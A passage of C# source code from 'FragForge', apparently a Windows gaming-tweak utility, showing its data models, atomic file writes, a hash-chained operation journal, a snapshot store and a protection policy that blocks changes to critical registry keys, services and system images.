public enum NetworkKind { Unknown, Ethernet, WiFi, Other }
public enum PreflightSeverity { Info, Warning, Blocking }
public enum ExperimentPhase { BeforeApply, AfterApply, AfterRevert }
public enum JournalEventType { OperationStarted, SnapshotCreated, RestorePointCreated, TweakCaptureCompleted, TweakApplyStarted, TweakApplied, TweakSkipped, TweakRollbackStarted, TweakRolledBack, TweakRollbackFailed, OperationCompleted, OperationFailed, RevertStarted, RevertCompleted, RevertFailed, SnapshotReverted, PolicyRejected, HookCompleted }
````

### `src/FragForge.Core/Models/FragForgeException.cs`  <sub>(20 líneas)</sub>

````csharp
namespace FragForge.Core.Models;

public class FragForgeException : Exception
{
    public string Code { get; }
    public FragForgeException(string code, string message, Exception? inner = null) : base(message, inner) => Code = code;
}
public sealed class CatalogValidationException(string message, IReadOnlyList<string> errors) : FragForgeException("catalog_invalid", message)
{
    public IReadOnlyList<string> Errors { get; } = errors;
}
public sealed class ProtectedTargetException(string target, string reason) : FragForgeException("protected_target", $"El destino '{target}' está protegido: {reason}");
public sealed class ActionNotApplicableException(string message) : FragForgeException("action_not_applicable", message);
public sealed class VerificationFailedException(string message) : FragForgeException("verification_failed", message);
public sealed class PreflightFailedException(string message, PreflightReport report) : FragForgeException("preflight_failed", message)
{
    public PreflightReport Report { get; } = report;
}
public sealed class RollbackException(string message, Exception? inner = null) : FragForgeException("rollback_failed", message, inner);
public sealed class ProcessFailedException(string executable, int exitCode, string error) : FragForgeException("process_failed", $"'{executable}' terminó con código {exitCode}: {error}");
````

### `src/FragForge.Core/Models/HardwareProfile.cs`  <sub>(171 líneas)</sub>

````csharp
namespace FragForge.Core.Models;

public sealed record HardwareProfile
{
    public DateTimeOffset CapturedAt { get; init; } = DateTimeOffset.UtcNow;
    public string MachineName { get; init; } = Environment.MachineName;
    public string? InteractiveUserName { get; init; }
    public string? InteractiveUserSid { get; init; }
    public string ProcessUserSid { get; init; } = "";
    public OsInfo Os { get; init; } = new();
    public CpuInfo Cpu { get; init; } = new();
    public MemoryInfo Memory { get; init; } = new();
    public IReadOnlyList<GpuInfo> Gpus { get; init; } = [];
    public IReadOnlyList<DiskInfo> Disks { get; init; } = [];
    public IReadOnlyList<NetworkAdapterInfo> NetworkAdapters { get; init; } = [];
    public IReadOnlyList<MonitorInfo> Monitors { get; init; } = [];
    public SecurityInfo Security { get; init; } = new();
    public PowerInfo Power { get; init; } = new();
    public FormFactorInfo FormFactor { get; init; } = new();
    public IReadOnlyList<PlaybookDetection> Playbooks { get; init; } = [];
    public IReadOnlyList<DeviceErrorInfo> DeviceErrors { get; init; } = [];
    public GameInfo Games { get; init; } = new();
    public SystemMaintenanceInfo Maintenance { get; init; } = new();
    public IReadOnlyList<DiagnosticObservation> Observations { get; init; } = [];
    public IReadOnlyList<string> ProbeWarnings { get; init; } = [];
    public bool IsUnsupportedPlatform { get; init; }
}

public sealed record OsInfo
{
    public string Name { get; init; } = "Unknown";
    public string Edition { get; init; } = "Unknown";
    public string Version { get; init; } = "Unknown";
    public int Build { get; init; }
    public int Ubr { get; init; }
    public string Architecture { get; init; } = "Unknown";
    public string Culture { get; init; } = "es-MX";
    public string TimeZone { get; init; } = "Unknown";
}

public sealed record CpuInfo
{
    public string Model { get; init; } = "Unknown";
    public string Vendor { get; init; } = "Unknown";
    public int PhysicalCores { get; init; }
    public int LogicalProcessors { get; init; }
    public int? PCores { get; init; }
    public int? ECores { get; init; }
    public bool? IsHybrid { get; init; }
    public string TopologySource { get; init; } = "Unknown";
    public bool? FirmwareVirtualizationEnabled { get; init; }
    public int? BaseClockMhz { get; init; }
}

public sealed record MemoryInfo
{
    public ulong TotalBytes { get; init; }
    public MemoryChannelState Channels { get; init; } = MemoryChannelState.Unknown;
    public string ChannelEvidence { get; init; } = "WMI does not expose memory-controller interleaving reliably.";
    public int? ConfiguredSpeedMtPerSecond { get; init; }
    public IReadOnlyList<MemoryModuleInfo> Modules { get; init; } = [];
}

public sealed record MemoryModuleInfo
{
    public string? Manufacturer { get; init; }
    public string? PartNumber { get; init; }
    public string? BankLabel { get; init; }
    public string? DeviceLocator { get; init; }
    public ulong CapacityBytes { get; init; }
    public int? SpeedMtPerSecond { get; init; }
    public int? ConfiguredSpeedMtPerSecond { get; init; }
    public int? SmbiosMemoryType { get; init; }
}

public sealed record GpuInfo
{
    public string Name { get; init; } = "Unknown";
    public GpuVendor Vendor { get; init; }
    public string? DriverVersion { get; init; }
    public ulong? ReportedAdapterRamBytes { get; init; }
    public ulong? SharedMemoryBudgetBytes { get; init; }
    public bool IsIntegrated { get; init; }
    public string MemoryNote { get; init; } = "AdapterRAM is a firmware/reporting value, not a measurement of usable shared VRAM.";
}

public sealed record DiskInfo
{
    public string Model { get; init; } = "Unknown";
    public string? SerialNumber { get; init; }
    public ulong SizeBytes { get; init; }
    public DiskKind Kind { get; init; }
    public string Bus { get; init; } = "Unknown";
    public string Health { get; init; } = "Unknown";
    public bool? SmartPredictFailure { get; init; }
    public string SmartSource { get; init; } = "Unavailable";
    public ulong FreeBytes { get; init; }
    public string? SystemDrive { get; init; }
}

public sealed record NetworkAdapterInfo
{
    public string Name { get; init; } = "Unknown";
    public string Description { get; init; } = "Unknown";
    public NetworkKind Kind { get; init; }
    public string? DriverVersion { get; init; }
    public string? DriverProvider { get; init; }
    public ulong? LinkSpeedBitsPerSecond { get; init; }
    public bool IsPhysical { get; init; }
    public string State { get; init; } = "Unknown";
}

public sealed record MonitorInfo
{
    public string Name { get; init; } = "Unknown";
    public int? Width { get; init; }
    public int? Height { get; init; }
    public int? RefreshRateHz { get; init; }
    public string Source { get; init; } = "Unknown";
}

public sealed record SecurityInfo
{
    public FeatureState Vbs { get; init; } = FeatureState.Unknown;
    public FeatureState Hvci { get; init; } = FeatureState.Unknown;
    public FeatureState SecureBoot { get; init; } = FeatureState.Unknown;
    public FeatureState Tpm { get; init; } = FeatureState.Unknown;
    public string? TpmVersion { get; init; }
    public FeatureState Hags { get; init; } = FeatureState.Unknown;
    public FeatureState Mpo { get; init; } = FeatureState.Unknown;
    public string Evidence { get; init; } = "No probe has run.";
}

public sealed record PowerInfo
{
    public string? ActiveSchemeGuid { get; init; }
    public string? ActiveSchemeName { get; init; }
    public int? Pl1Watts { get; init; }
    public int? Pl2Watts { get; init; }
    public string PowerLimitSource { get; init; } = "Unavailable; DTT/IPF may own PL1/PL2.";
}

public sealed record FormFactorInfo
{
    public bool? IsPortable { get; init; }
    public bool HasBattery { get; init; }
    public IReadOnlyList<string> ChassisTypes { get; init; } = [];
    public string? SystemModel { get; init; }
    public string? BiosVersion { get; init; }
}

public sealed record PlaybookDetection(string Name, string Confidence, IReadOnlyList<string> Evidence);
public sealed record DeviceErrorInfo(string Name, string InstanceId, int ErrorCode, string? DriverName);
public sealed record GameInfo
{
    public string? Cs2ExecutablePath { get; init; }
    public string Cs2DetectionSource { get; init; } = "Not detected";
    public IReadOnlyList<string> Cs2Candidates { get; init; } = [];
    public bool Cs2Ambiguous { get; init; }
}
public sealed record SystemMaintenanceInfo
{
    public bool PendingReboot { get; init; }
    public IReadOnlyList<string> PendingRebootReasons { get; init; } = [];
    public bool WindowsServicingActive { get; init; }
    public IReadOnlyList<string> ServicingProcesses { get; init; } = [];
    public FeatureState SystemProtection { get; init; } = FeatureState.Unknown;
    public bool IsAdministrator { get; init; }
    public ulong SystemDriveFreeBytes { get; init; }
}
public sealed record DiagnosticObservation(string Key, string Value, string Source, string Confidence, string? Note = null);
````

### `src/FragForge.Core/Models/LocalizedText.cs`  <sub>(12 líneas)</sub>

````csharp
using System.Text.Json.Serialization;

namespace FragForge.Core.Models;

public sealed record LocalizedText
{
    [JsonPropertyName("es-MX")]
    public required string EsMx { get; init; }
    [JsonPropertyName("en-US")]
    public required string EnUs { get; init; }
    public string Resolve(string? culture) => culture?.StartsWith("en", StringComparison.OrdinalIgnoreCase) == true ? EnUs : EsMx;
}
````

### `src/FragForge.Core/Models/Results.cs`  <sub>(86 líneas)</sub>

````csharp
namespace FragForge.Core.Models;

public sealed record VerificationResult(VerificationOutcome Outcome, string Message)
{
    public static VerificationResult Match(string message = "El estado coincide.") => new(VerificationOutcome.Matches, message);
    public static VerificationResult Missing(string message) => new(VerificationOutcome.DoesNotMatch, message);
}

public sealed record ConditionResult(bool IsMet, bool IsKnown, string Reason)
{
    public static ConditionResult Met(string reason) => new(true, true, reason);
    public static ConditionResult Unmet(string reason) => new(false, true, reason);
    public static ConditionResult Unknown(string reason) => new(false, false, reason);
}

public sealed record TweakStatus(string Id, TweakState State, string Reason, IReadOnlyList<VerificationResult> ActionResults, IReadOnlyList<DiagnosticObservation> Observations);
public sealed record ScanReport(HardwareProfile Hardware, IReadOnlyList<TweakStatus> Tweaks, DateTimeOffset CreatedAt);
public sealed record EngineProgress(string Stage, string? TweakId, double Fraction, string Message);
public sealed record ActionProgress(string Stage, double Fraction, string Message);

public sealed record ApplyOptions
{
    public bool DryRun { get; init; }
    public bool Force { get; init; }
    public bool CreateRestorePoint { get; init; } = true;
    public bool EnableSystemProtection { get; init; }
    public TweakProfile Profile { get; init; } = TweakProfile.Safe;
    public IReadOnlySet<string> RiskAcknowledgements { get; init; } = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
    public string? AdvancedRiskPhrase { get; init; }
    public string? Cs2ExecutableOverride { get; init; }
    public string? TargetUserSid { get; init; }
    public bool AllowPowerShellActions { get; init; }
}

public sealed record RevertOptions
{
    public bool Force { get; init; }
    public string? TargetUserSid { get; init; }
    public string? Cs2ExecutableOverride { get; init; }
}

public sealed record RevertRequest
{
    public IReadOnlyList<string> Ids { get; init; } = [];
    public string? SnapshotId { get; init; }
    public bool Last { get; init; }
    public RevertOptions Options { get; init; } = new();
}

public sealed record DryRunChange(string TweakId, int ActionIndex, string Kind, string Description);
public sealed record TweakApplyResult
{
    public required string Id { get; init; }
    public required TweakState State { get; init; }
    public required string Message { get; init; }
    public bool Changed { get; init; }
    public bool RolledBack { get; init; }
    public bool RollbackFailed { get; init; }
    public IReadOnlyList<DryRunChange> PlannedChanges { get; init; } = [];
    public IReadOnlyList<string> Warnings { get; init; } = [];
}

public sealed record BatchReport
{
    public required string OperationId { get; init; }
    public string? SnapshotId { get; init; }
    public bool DryRun { get; init; }
    public bool Success { get; init; }
    public bool Cancelled { get; init; }
    public bool HasCriticalFailure { get; init; }
    public long? RestorePointSequence { get; init; }
    public IReadOnlyList<TweakApplyResult> Results { get; init; } = [];
    public IReadOnlyList<string> Errors { get; init; } = [];
    public IReadOnlyList<string> Warnings { get; init; } = [];
}

public sealed record PreflightCheck(string Id, PreflightSeverity Severity, string Message, string? Remediation = null);
public sealed record PreflightReport(bool CanApply, IReadOnlyList<PreflightCheck> Checks)
{
    public static PreflightReport Passed(IReadOnlyList<PreflightCheck> checks) => new(!checks.Any(c => c.Severity == PreflightSeverity.Blocking), checks);
}
public sealed record RestorePointResult(long? Sequence, string Message);
public sealed record ExperimentContext(string OperationId, string? SnapshotId, ExperimentPhase Phase, TweakDefinition Tweak, HardwareProfile Hardware, DateTimeOffset Timestamp, string? ArtifactDirectory = null);
public sealed record ExperimentArtifact(string Name, string Path, string ContentType);
public sealed record BenchmarkMeasurement(string Metric, double Value, string Unit, IReadOnlyDictionary<string, string> Metadata);
public sealed record BenchmarkSession(string Id, string Label, IReadOnlyList<BenchmarkMeasurement> Measurements, IReadOnlyList<ExperimentArtifact> Artifacts);
````

### `src/FragForge.Core/Models/Snapshot.cs`  <sub>(43 líneas)</sub>

````csharp
using System.Text.Json;

namespace FragForge.Core.Models;

public sealed record TweakSnapshot
{
    public required string TweakId { get; init; }
    public required string DefinitionSha256 { get; init; }
    public required TweakDefinition Definition { get; init; }
    public required IReadOnlyList<CapturedAction> Actions { get; init; }
    public DateTimeOffset CapturedAt { get; init; } = DateTimeOffset.UtcNow;
}

public sealed record SystemSnapshot
{
    public int SchemaVersion { get; init; } = 1;
    public required string Id { get; init; }
    public string Label { get; init; } = "";
    public DateTimeOffset CreatedAt { get; init; } = DateTimeOffset.UtcNow;
    public string CreatedByVersion { get; init; } = "0.1.0";
    public HardwareProfile? Hardware { get; init; }
    public long? RestorePointSequence { get; init; }
    public IReadOnlyList<TweakSnapshot> Tweaks { get; init; } = [];
    public IReadOnlyList<string> Artifacts { get; init; } = [];
}

public sealed record JournalEntry
{
    public required string EntryId { get; init; }
    public required string OperationId { get; init; }
    public required JournalEventType EventType { get; init; }
    public DateTimeOffset Timestamp { get; init; } = DateTimeOffset.UtcNow;
    public string? TweakId { get; init; }
    public string? SnapshotId { get; init; }
    public string? Message { get; init; }
    [System.Text.Json.Serialization.JsonIgnore(Condition = System.Text.Json.Serialization.JsonIgnoreCondition.WhenWritingDefault)]
    public JsonElement Data { get; init; }
    public string? PreviousHash { get; init; }
    public string Hash { get; init; } = "";
}

public sealed record JournalIntegrity(bool IsValid, int Entries, string? Error);
public sealed record SnapshotListItem(string Id, string Label, DateTimeOffset CreatedAt, int TweakCount, long? RestorePointSequence, bool Reverted);
````

### `src/FragForge.Core/Models/TweakDefinition.cs`  <sub>(51 líneas)</sub>

````csharp
using System.Text.Json;
using System.Text.Json.Serialization;

namespace FragForge.Core.Models;

public sealed record TweakDefinition
{
    public required string Id { get; init; }
    public required string Category { get; init; }
    public required LocalizedText Title { get; init; }
    public required LocalizedText Description { get; init; }
    public required EvidenceLevel Evidence { get; init; }
    public required RiskLevel Risk { get; init; }
    public bool RequiresReboot { get; init; }
    public bool RequiresAdmin { get; init; } = true;
    public IReadOnlyList<ConditionSpec> Conditions { get; init; } = [];
    public IReadOnlyList<ActionSpec> Actions { get; init; } = [];
    public IReadOnlyList<string> Tags { get; init; } = [];
    public IReadOnlyList<string> ConflictsWith { get; init; } = [];
    public IReadOnlyList<string> DependsOn { get; init; } = [];
    public required ExpectedImpact ExpectedImpact { get; init; }
    public IReadOnlyList<string> References { get; init; } = [];
    public LocalizedText? Notes { get; init; }
    public LocalizedText? WhenNotToApply { get; init; }
    public bool ReadOnly => Actions.Count > 0 && Actions.All(a => a.Kind.Equals("InspectOnly", StringComparison.OrdinalIgnoreCase));
}

public sealed record ConditionSpec
{
    public required string Type { get; init; }
    [JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingDefault)]
    public JsonElement Parameters { get; init; }
}

public sealed record ActionSpec
{
    public required string Kind { get; init; }
    [JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingDefault)]
    public JsonElement Parameters { get; init; }
}

public sealed record ExpectedImpact
{
    public string Fps { get; init; } = "None";
    [JsonPropertyName("1%lows")]
    public string OnePercentLows { get; init; } = "None";
    public string InputLatency { get; init; } = "None";
    public string Network { get; init; } = "None";
    public string Boot { get; init; } = "None";
    public string Thermals { get; init; } = "None";
}
````

### `src/FragForge.Core/Persistence/AtomicFile.cs`  <sub>(36 líneas)</sub>

````csharp
namespace FragForge.Core.Persistence;

public static class AtomicFile
{
    public static async Task WriteAllTextAsync(string path, string content, CancellationToken cancellationToken = default)
    {
        var directory = Path.GetDirectoryName(Path.GetFullPath(path)) ?? throw new ArgumentException("Invalid file path.", nameof(path));
        Directory.CreateDirectory(directory);
        var temporary = Path.Combine(directory, "." + Path.GetFileName(path) + "." + Guid.NewGuid().ToString("N") + ".tmp");
        try
        {
            var stream = new FileStream(temporary, FileMode.CreateNew, FileAccess.Write, FileShare.None, 64 * 1024, FileOptions.Asynchronous | FileOptions.WriteThrough);
            await using (stream.ConfigureAwait(false))
            {
                var writer = new StreamWriter(stream, new System.Text.UTF8Encoding(false), 64 * 1024, leaveOpen: true);
                await using (writer.ConfigureAwait(false)) { await writer.WriteAsync(content.AsMemory(), cancellationToken); await writer.FlushAsync(cancellationToken); }
                await stream.FlushAsync(cancellationToken);
            }
            File.Move(temporary, path, true);
        }
        finally { if (File.Exists(temporary)) File.Delete(temporary); }
    }
    public static async Task WriteAllBytesAsync(string path, byte[] content, CancellationToken cancellationToken = default)
    {
        var directory = Path.GetDirectoryName(Path.GetFullPath(path)) ?? throw new ArgumentException("Invalid file path.", nameof(path));
        Directory.CreateDirectory(directory);
        var temporary = Path.Combine(directory, "." + Path.GetFileName(path) + "." + Guid.NewGuid().ToString("N") + ".tmp");
        try
        {
            var stream = new FileStream(temporary, FileMode.CreateNew, FileAccess.Write, FileShare.None, 64 * 1024, FileOptions.Asynchronous | FileOptions.WriteThrough);
            await using (stream.ConfigureAwait(false)) { await stream.WriteAsync(content, cancellationToken); await stream.FlushAsync(cancellationToken); }
            File.Move(temporary, path, true);
        }
        finally { if (File.Exists(temporary)) File.Delete(temporary); }
    }
}
````

### `src/FragForge.Core/Persistence/FileExecutionGate.cs`  <sub>(31 líneas)</sub>

````csharp
using FragForge.Core.Abstractions;

namespace FragForge.Core.Persistence;

public sealed class FileExecutionGate(FragForgePaths paths) : IExecutionGate
{
    public async Task<IAsyncDisposable> AcquireAsync(CancellationToken cancellationToken = default)
    {
        paths.EnsureCreated();
        while (true)
        {
            cancellationToken.ThrowIfCancellationRequested();
            try
            {
                var stream = new FileStream(paths.LockFile, FileMode.OpenOrCreate, FileAccess.ReadWrite, FileShare.None, 1, FileOptions.Asynchronous);
                return new Lease(stream);
            }
            catch (IOException) { await Task.Delay(100, cancellationToken); }
            catch (UnauthorizedAccessException) { await Task.Delay(100, cancellationToken); }
        }
    }
    private sealed class Lease(FileStream stream) : IAsyncDisposable
    {
        public ValueTask DisposeAsync() => stream.DisposeAsync();
    }
}
public sealed class NullExecutionGate : IExecutionGate
{
    public Task<IAsyncDisposable> AcquireAsync(CancellationToken cancellationToken = default) => Task.FromResult<IAsyncDisposable>(new Lease());
    private sealed class Lease : IAsyncDisposable { public ValueTask DisposeAsync() => ValueTask.CompletedTask; }
}
````

### `src/FragForge.Core/Persistence/FileJournal.cs`  <sub>(76 líneas)</sub>

````csharp
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using FragForge.Core.Abstractions;
using FragForge.Core.Logging;
using FragForge.Core.Models;

namespace FragForge.Core.Persistence;

public sealed class FileJournal(FragForgePaths paths) : IJournal
{
    private readonly SemaphoreSlim _gate = new(1, 1);
    public async Task AppendAsync(JournalEntry entry, CancellationToken cancellationToken = default)
    {
        await _gate.WaitAsync(cancellationToken);
        try
        {
            Directory.CreateDirectory(Path.GetDirectoryName(paths.Journal)!);
            string? previousHash = null;
            if (File.Exists(paths.Journal))
            {
                var lines = await File.ReadAllLinesAsync(paths.Journal, cancellationToken);
                if (lines.Length > 0)
                {
                    var last = JsonSerializer.Deserialize<JournalEntry>(lines[^1], JsonDefaults.Options) ?? throw new InvalidDataException("Journal corrupto.");
                    if (ComputeHash(last with { Hash = "" }) != last.Hash) throw new InvalidDataException("La última entrada del journal no pasó la verificación de integridad.");
                    previousHash = last.Hash;
                }
            }
            var unsigned = entry with { PreviousHash = previousHash, Hash = "" };
            var signed = unsigned with { Hash = ComputeHash(unsigned) };
            var line = JsonSerializer.Serialize(signed, JsonDefaults.Create(false));
            var stream = new FileStream(paths.Journal, FileMode.Append, FileAccess.Write, FileShare.Read, 4096, FileOptions.Asynchronous | FileOptions.WriteThrough);
            await using (stream.ConfigureAwait(false))
            {
                var writer = new StreamWriter(stream, new UTF8Encoding(false), 4096, leaveOpen: true);
                await using (writer.ConfigureAwait(false)) { await writer.WriteLineAsync(line.AsMemory(), cancellationToken); await writer.FlushAsync(cancellationToken); }
                await stream.FlushAsync(cancellationToken);
            }
        }
        finally { _gate.Release(); }
    }
    public async Task<IReadOnlyList<JournalEntry>> ReadAllAsync(CancellationToken cancellationToken = default)
    {
        await _gate.WaitAsync(cancellationToken);
        try
        {
            if (!File.Exists(paths.Journal)) return [];
            var entries = new List<JournalEntry>();
            foreach (var line in await File.ReadAllLinesAsync(paths.Journal, cancellationToken))
            {
                if (string.IsNullOrWhiteSpace(line)) throw new InvalidDataException("Línea vacía en journal.");
                entries.Add(JsonSerializer.Deserialize<JournalEntry>(line, JsonDefaults.Options) ?? throw new InvalidDataException("Entrada de journal nula."));
            }
            return entries;
        }
        finally { _gate.Release(); }
    }
    public async Task<JournalIntegrity> VerifyIntegrityAsync(CancellationToken cancellationToken = default)
    {
        try
        {
            var entries = await ReadAllAsync(cancellationToken);
            string? previous = null;
            for (var i = 0; i < entries.Count; i++)
            {
                var entry = entries[i];
                if (entry.PreviousHash != previous || ComputeHash(entry with { Hash = "" }) != entry.Hash) return new JournalIntegrity(false, i, $"Integridad inválida en entrada {i + 1}.");
                previous = entry.Hash;
            }
            return new JournalIntegrity(true, entries.Count, null);
        }
        catch (Exception ex) when (ex is JsonException or InvalidDataException or IOException) { return new JournalIntegrity(false, 0, ex.Message); }
    }
    private static string ComputeHash(JournalEntry entry) => Convert.ToHexString(SHA256.HashData(Encoding.UTF8.GetBytes(JsonSerializer.Serialize(entry, JsonDefaults.Create(false))))).ToLowerInvariant();
}
````

### `src/FragForge.Core/Persistence/FileSnapshotStore.cs`  <sub>(57 líneas)</sub>

````csharp
using System.Text.Json;
using System.Text.RegularExpressions;
using FragForge.Core.Abstractions;
using FragForge.Core.Logging;
using FragForge.Core.Models;

namespace FragForge.Core.Persistence;

public sealed partial class FileSnapshotStore(FragForgePaths paths) : ISnapshotStore
{
    public string RootPath => paths.Snapshots;
    public string GetArtifactDirectory(string snapshotId) => Path.Combine(paths.Snapshots, ValidateId(snapshotId), "artifacts");
    public async Task SaveAsync(SystemSnapshot snapshot, CancellationToken cancellationToken = default)
    {
        ValidateId(snapshot.Id);
        if (snapshot.SchemaVersion != 1) throw new InvalidDataException($"Unsupported snapshot schema {snapshot.SchemaVersion}.");
        var directory = Path.Combine(paths.Snapshots, snapshot.Id);
        Directory.CreateDirectory(directory);
        var artifacts = Directory.Exists(GetArtifactDirectory(snapshot.Id))
            ? Directory.GetFiles(GetArtifactDirectory(snapshot.Id), "*", SearchOption.AllDirectories).Select(p => Path.GetRelativePath(directory, p).Replace('\\', '/')).OrderBy(x => x, StringComparer.Ordinal).ToArray()
            : [];
        var final = snapshot with { Artifacts = artifacts };
        var json = JsonSerializer.Serialize(final, JsonDefaults.Options);
        await AtomicFile.WriteAllTextAsync(Path.Combine(directory, "snapshot.json"), json, cancellationToken);
    }
    public async Task<SystemSnapshot> GetAsync(string snapshotId, CancellationToken cancellationToken = default)
    {
        var path = Path.Combine(paths.Snapshots, ValidateId(snapshotId), "snapshot.json");
        if (!File.Exists(path)) throw new FileNotFoundException($"No existe el snapshot '{snapshotId}'.", path);
        var snapshot = JsonSerializer.Deserialize<SystemSnapshot>(await File.ReadAllTextAsync(path, cancellationToken), JsonDefaults.Options) ?? throw new InvalidDataException("Snapshot vacío.");
        if (snapshot.SchemaVersion != 1 || snapshot.Id != snapshotId) throw new InvalidDataException("Snapshot version/identity mismatch.");
        foreach (var artifact in snapshot.Artifacts)
        {
            var full = Path.GetFullPath(Path.Combine(Path.GetDirectoryName(path)!, artifact));
            if (!full.StartsWith(Path.GetFullPath(Path.GetDirectoryName(path)!) + Path.DirectorySeparatorChar, StringComparison.Ordinal)) throw new InvalidDataException("Artifact path escapes snapshot directory.");
        }
        return snapshot;
    }
    public async Task<IReadOnlyList<SystemSnapshot>> ListAsync(CancellationToken cancellationToken = default)
    {
        if (!Directory.Exists(paths.Snapshots)) return [];
        var result = new List<SystemSnapshot>();
        foreach (var directory in Directory.GetDirectories(paths.Snapshots).OrderBy(x => x, StringComparer.Ordinal))
        {
            cancellationToken.ThrowIfCancellationRequested();
            if (File.Exists(Path.Combine(directory, "snapshot.json"))) result.Add(await GetAsync(Path.GetFileName(directory), cancellationToken));
        }
        return result.OrderByDescending(s => s.CreatedAt).ToArray();
    }
    private static string ValidateId(string id)
    {
        if (!IdRegex().IsMatch(id)) throw new ArgumentException("Identificador de snapshot inválido.", nameof(id));
        return id;
    }
    [GeneratedRegex("^[A-Za-z0-9_-]{1,80}$")]
    private static partial Regex IdRegex();
}
````

### `src/FragForge.Core/Persistence/FragForgePaths.cs`  <sub>(20 líneas)</sub>

````csharp
namespace FragForge.Core.Persistence;

public sealed class FragForgePaths
{
    public string Root { get; }
    public string Snapshots => Path.Combine(Root, "snapshots");
    public string Journal => Path.Combine(Root, "journal", "journal.ndjson");
    public string Logs => Path.Combine(Root, "logs");
    public string Reports => Path.Combine(Root, "reports");
    public string AdditionalPolicy => Path.Combine(Root, "policy", "denylist.json");
    public string LockFile => Path.Combine(Root, ".fragforge.lock");
    public FragForgePaths(string? root = null)
    {
        Root = string.IsNullOrWhiteSpace(root) ? Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "FragForge") : Path.GetFullPath(root);
    }
    public void EnsureCreated()
    {
        foreach (var path in new[] { Root, Snapshots, Path.GetDirectoryName(Journal)!, Logs, Reports, Path.GetDirectoryName(AdditionalPolicy)! }) Directory.CreateDirectory(path);
    }
}
````

### `src/FragForge.Core/Persistence/ProtectionPolicy.cs`  <sub>(122 líneas)</sub>

````csharp
using System.Text.Json;
using System.Text.RegularExpressions;
using FragForge.Core.Abstractions;
using FragForge.Core.Logging;
using FragForge.Core.Models;

namespace FragForge.Core.Persistence;

public sealed partial class ProtectionPolicy : IProtectionPolicy
{
    private readonly PolicyDocument _document;
    private ProtectionPolicy(PolicyDocument document) => _document = document;
    public static ProtectionPolicy CreateDefault()
    {
        using var stream = typeof(ProtectionPolicy).Assembly.GetManifestResourceStream("FragForge.Core.Policy.denylist.json") ?? throw new InvalidDataException("Embedded denylist is missing.");
        using var reader = new StreamReader(stream);
        var document = JsonSerializer.Deserialize<PolicyDocument>(reader.ReadToEnd(), JsonDefaults.Options) ?? throw new InvalidDataException("Embedded denylist is empty.");
        return new ProtectionPolicy(document);
    }
    public static async Task<ProtectionPolicy> LoadAsync(string? additionalPolicyPath, CancellationToken cancellationToken = default)
    {
        var policy = CreateDefault();
        if (string.IsNullOrWhiteSpace(additionalPolicyPath) || !File.Exists(additionalPolicyPath)) return policy;
        var extra = JsonSerializer.Deserialize<PolicyDocument>(await File.ReadAllTextAsync(additionalPolicyPath, cancellationToken), JsonDefaults.Options) ?? throw new InvalidDataException("Additional denylist is empty.");
        if (extra.SchemaVersion != 1) throw new InvalidDataException("Unsupported denylist schema version.");
        policy._document.Services.AddRange(extra.Services);
        policy._document.RegistryKeyPrefixes.AddRange(extra.RegistryKeyPrefixes);
        policy._document.RegistryValueNames.AddRange(extra.ValueNames());
        policy._document.TaskPrefixes.AddRange(extra.TaskPrefixes);
        policy._document.BcdDenyElements.AddRange(extra.BcdDenyElements);
        policy._document.FilePrefixes.AddRange(extra.FilePrefixes);
        policy._document.NetworkPropertyKeywords.AddRange(extra.NetworkPropertyKeywords);
        policy._document.PowerShellDeniedTokens.AddRange(extra.PowerShellDeniedTokens);
        return policy;
    }
    public void EnsureRegistryAllowed(string key, string? valueName = null)
    {
        var canonical = RegistryPath.Canonicalize(key);
        foreach (var prefix in _document.RegistryKeyPrefixes)
        {
            var normalized = NormalizePrefix(prefix);
            if (MatchesPrefix(canonical, normalized)) throw new ProtectedTargetException(canonical, "prefijo de clave protegida");
        }
        var serviceMatch = ServiceKeyRegex().Match(canonical);
        if (serviceMatch.Success) EnsureServiceAllowed(serviceMatch.Groups[1].Value);
        if (valueName is not null && _document.RegistryValueNames.Contains(valueName, StringComparer.OrdinalIgnoreCase)) throw new ProtectedTargetException($"{canonical}\\{valueName}", "valor de ejecución/seguridad protegido");
        if (canonical.Contains("\\Image File Execution Options\\", StringComparison.OrdinalIgnoreCase))
        {
            var image = canonical.Split("\\Image File Execution Options\\", StringSplitOptions.None)[1].Split('\\')[0];
            if (image.Equals("csrss.exe", StringComparison.OrdinalIgnoreCase) || image.Equals("lsass.exe", StringComparison.OrdinalIgnoreCase) || image.Equals("services.exe", StringComparison.OrdinalIgnoreCase) || image.Equals("MsMpEng.exe", StringComparison.OrdinalIgnoreCase)) throw new ProtectedTargetException(canonical, "imagen crítica de Windows");
        }
    }
    public void EnsureServiceAllowed(string name)
    {
        if (_document.Services.Contains(name, StringComparer.OrdinalIgnoreCase)) throw new ProtectedTargetException(name, "servicio esencial, de seguridad o protegido por el perfil Intel");
    }
    public void EnsureTaskAllowed(string path)
    {
        var normalized = "\\" + path.Trim().Trim('\\').Replace('/', '\\');
        if (_document.TaskPrefixes.Any(p => MatchesPrefix(normalized, "\\" + p.Trim('\\')))) throw new ProtectedTargetException(normalized, "tarea de seguridad/mantenimiento protegida");
    }
    public void EnsureBcdAllowed(string element)
    {
        if (_document.BcdDenyElements.Contains(element, StringComparer.OrdinalIgnoreCase) || !_document.BcdAllowedElements.Contains(element, StringComparer.OrdinalIgnoreCase)) throw new ProtectedTargetException(element, "elemento BCD no permitido por la política");
    }
    public void EnsureFileAllowed(string path)
    {
        var full = Path.GetFullPath(Environment.ExpandEnvironmentVariables(path));
        var key = PolicyPath(path);
        foreach (var prefix in _document.FilePrefixes)
        {
            var normalized = PolicyPath(prefix);
            if (key.Equals(normalized, StringComparison.OrdinalIgnoreCase) || key.StartsWith(normalized.TrimEnd('\\') + "\\", StringComparison.OrdinalIgnoreCase)) throw new ProtectedTargetException(full, "ruta de sistema protegida");
            var expandedPrefix = Path.GetFullPath(Environment.ExpandEnvironmentVariables(prefix));
            if (full.Equals(expandedPrefix, StringComparison.OrdinalIgnoreCase) || full.StartsWith(expandedPrefix.TrimEnd(Path.DirectorySeparatorChar) + Path.DirectorySeparatorChar, StringComparison.OrdinalIgnoreCase)) throw new ProtectedTargetException(full, "ruta de sistema protegida");
        }
        var reduced = key.ToLowerInvariant();
